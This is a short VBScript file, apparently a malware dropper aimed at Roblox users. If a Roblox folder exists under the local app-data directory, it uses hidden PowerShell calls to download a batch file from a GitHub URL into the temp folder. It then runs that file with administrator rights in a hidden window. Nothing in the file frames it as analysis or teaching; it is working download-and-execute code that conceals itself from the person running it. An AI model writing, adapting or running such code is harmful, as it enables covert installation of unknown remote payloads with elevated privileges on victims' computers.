Option Explicit

Dim objFSO, objShell, objNetwork, strFolderPath, strURL, strTempBatFile, strCmd

' Define the folder path and download URL
strFolderPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%localappdata%\Roblox")
strURL = "https://raw.githubusercontent.com/skibidzaa/tak/main/downloader.bat"
strTempBatFile = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%\downloader.bat")

' Create FileSystemObject
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Check if the folder exists
If objFSO.FolderExists(strFolderPath) Then
    ' Download the bat file using PowerShell
    strCmd = "powershell -Command ""(New-Object Net.WebClient).DownloadFile('" & strURL & "', '" & strTempBatFile & "')"""
    CreateObject("WScript.Shell").Run strCmd, 0, True
    
    ' Run the downloaded bat file as Administrator in a hidden window
    strCmd = "powershell -Command ""Start-Process cmd.exe -ArgumentList '/c " & strTempBatFile & "' -Verb RunAs -WindowStyle Hidden"""
    CreateObject("WScript.Shell").Run strCmd, 0, True
End If
